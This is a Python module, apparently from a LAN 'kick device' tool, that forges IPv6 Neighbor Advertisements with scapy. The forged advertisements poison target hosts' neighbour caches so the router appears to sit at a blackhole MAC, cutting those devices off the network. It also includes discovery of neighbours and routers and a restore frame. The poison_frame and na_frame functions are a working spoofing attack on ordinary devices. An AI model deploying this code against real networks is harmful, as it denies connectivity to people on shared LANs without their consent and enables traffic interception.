"""IPv6 neighbour discovery, the layer-2 half of the problem ARP only covers.

Most home LANs hand out IPv6 with router advertisements, and a device with a
working IPv6 address keeps reaching the internet even when its ARP entry is
poisoned. The IPv6 equivalent of ARP is NDP, and it is just as unauthenticated:
a Neighbor Advertisement can tell a host that the router's link-local address
lives at any MAC.

We send **unicast** advertisements to each target only — never multicast — so
one device is cut without touching the rest of the LAN.
"""

from __future__ import annotations

import platform
import re
import subprocess
import time

from scapy.all import (
    ICMPv6EchoRequest,
    ICMPv6ND_NA,
    ICMPv6NDOptDstLLAddr,
    Ether,
    IPv6,
    sendp,
)

BLACKHOLE_MAC = "02:00:00:00:00:01"
ALL_NODES = "ff02::1"
ALL_NODES_MAC = "33:33:00:00:00:01"


# -- parsers (pure, so they can be tested without a network) ---------------
def parse_default_route(text: str) -> str:
    for line in text.splitlines():
        if not line.split() or line.split()[0] != "default":
            continue
        match = re.search(r"\bvia\s+(\S+)", line)
        if match:
            return match.group(1).split("%")[0]
    return ""


def parse_ip_neigh(text: str) -> dict[str, str]:
    """Linux ``ip -6 neigh``: link-local beats a global address per MAC."""
    found: dict[str, str] = {}
    for line in text.splitlines():
        match = re.match(r"([0-9a-fA-F:]+)\s+.*?lladdr\s+([0-9a-fA-F:]{17})", line)
        if not match:
            continue
        ip, mac = match.group(1), match.group(2).lower()
        if mac not in found or ip.lower().startswith("fe80:"):
            found[mac] = ip
    return found


def parse_ndp(text: str, iface: str) -> dict[str, str]:
    """macOS ``ndp -an``: ``fe80::1%en0  3c:6a:d2:90:2c:06  en0  ...``."""
    found: dict[str, str] = {}
    for line in text.splitlines():
        match = re.match(r"([0-9a-fA-F:]+)%(\S+)\s+([0-9a-fA-F:]{17})", line)
        if not match:
            continue
        ip, ifname, mac = match.group(1), match.group(2), match.group(3).lower()
        if ifname != iface:
            continue
        if mac not in found or ip.lower().startswith("fe80:"):
            found[mac] = ip
    return found


def parse_router_neighbor(text: str) -> str:
    """Fallback: the neighbour table marks routers with the ``router`` flag."""
    for line in text.splitlines():
        fields = line.split()
        if fields and "router" in fields:
            return fields[0].split("%")[0]
    return ""


def parse_link_local(text: str) -> str:
    for line in text.splitlines():
        match = re.search(r"inet6\s+(fe80:[0-9a-fA-F:]+)", line)
        if match:
            return match.group(1)
    return ""


def eui64_link_local(mac: str) -> str:
    """Derive the link-local address a device would build from its MAC."""
    try:
        parts = [int(part, 16) for part in mac.replace("-", ":").split(":") if part]
    except ValueError:
        return ""
    if len(parts) != 6:
        return ""
    parts[0] ^= 0x02
    iid = parts[:3] + [0xFF, 0xFE] + parts[3:]
    groups = [f"{iid[index] << 8 | iid[index + 1]:x}" for index in range(0, 8, 2)]
    return "fe80::" + ":".join(groups)


# -- system queries --------------------------------------------------------
def _run(*argv: str) -> str:
    try:
        return subprocess.run(argv, capture_output=True, text=True, timeout=4).stdout
    except Exception:
        return ""


def default_router(iface: str) -> str:
    """The router's link-local address, as the target's default route sees it."""
    if platform.system() == "Darwin":
        for line in _run("netstat", "-rn", "-f", "inet6").splitlines():
            fields = line.split()
            if len(fields) >= 2 and fields[0] == "default" and iface in line:
                return fields[1].split("%")[0]
        return ""
    router = parse_default_route(_run("ip", "-6", "route", "show", "default", "dev", iface))
    if router:
        return router
    # networks that advertise only a ULA have no default route yet
    return parse_router_neighbor(_run("ip", "-6", "neigh", "show", "dev", iface))


def link_local(iface: str) -> str:
    if platform.system() == "Darwin":
        return parse_link_local(_run("ifconfig", iface))
    return parse_link_local(_run("ip", "-6", "addr", "show", "dev", iface, "scope", "link"))


def neighbors(iface: str) -> dict[str, str]:
    """MAC → IPv6 address, from the kernel's neighbour table."""
    if platform.system() == "Darwin":
        return parse_ndp(_run("ndp", "-an"), iface)
    return parse_ip_neigh(_run("ip", "-6", "neigh", "show", "dev", iface))


def discover(iface: str, our_mac: str = "", wait: float = 0.6) -> dict[str, str]:
    """Ping all-nodes once, which makes silent hosts answer and fill the table."""
    source = link_local(iface)
    if not source:
        return neighbors(iface)
    try:
        probe = (
            Ether(dst=ALL_NODES_MAC, src=our_mac or None)
            / IPv6(src=source, dst=ALL_NODES, hlim=255)
            / ICMPv6EchoRequest()
        )
        sendp(probe, iface=iface, verbose=0)
    except Exception:
        return neighbors(iface)
    time.sleep(wait)
    return neighbors(iface)


def target_ipv6(iface: str, mac: str, known: dict[str, str] | None = None) -> str:
    """Best address to send a unicast NA to: the table, discovery, then EUI-64."""
    table = neighbors(iface) if known is None else known
    return table.get(mac.lower()) or eui64_link_local(mac)


# -- frames ----------------------------------------------------------------
def na_frame(our_mac: str, target_mac: str, target_ip6: str, router_ip6: str,
             lladdr: str) -> Ether:
    """One forged Neighbor Advertisement: "the router is at *lladdr*"."""
    return (
        Ether(src=our_mac, dst=target_mac)
        / IPv6(src=router_ip6, dst=target_ip6, hlim=255)
        / ICMPv6ND_NA(tgt=router_ip6, R=0, S=0, O=1)
        / ICMPv6NDOptDstLLAddr(lladdr=lladdr)
    )


def poison_frame(our_mac: str, target_mac: str, target_ip6: str, router_ip6: str) -> Ether:
    return na_frame(our_mac, target_mac, target_ip6, router_ip6, BLACKHOLE_MAC)


def restore_frame(our_mac: str, target_mac: str, target_ip6: str, router_ip6: str,
                  router_mac: str) -> Ether:
    return na_frame(our_mac, target_mac, target_ip6, router_ip6, router_mac)
